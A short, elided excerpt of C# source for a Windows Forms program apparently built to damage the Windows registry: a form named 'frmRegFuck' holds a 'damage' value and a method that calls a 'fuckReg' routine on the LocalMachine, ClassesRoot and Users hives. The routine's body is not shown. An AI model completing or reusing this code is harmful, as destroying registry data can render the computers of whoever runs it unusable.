...
namespace YOUFuck
{
    public partial class frmRegFuck : Form
    {
        double damage = Math.Pow(2, (80 / (100.0 / 12)) - 12);
        public frmRegFuck()
        {
            InitializeComponent();
        }
        ...
        public void fuck()
        {
            ...
            fuckReg(Registry.LocalMachine, 0);
            fuckReg(Registry.ClassesRoot, 0.05);
            fuckReg(Registry.Users, 1);
        }

        private void FrmRegFuck_Load(object sender, EventArgs e)
        {
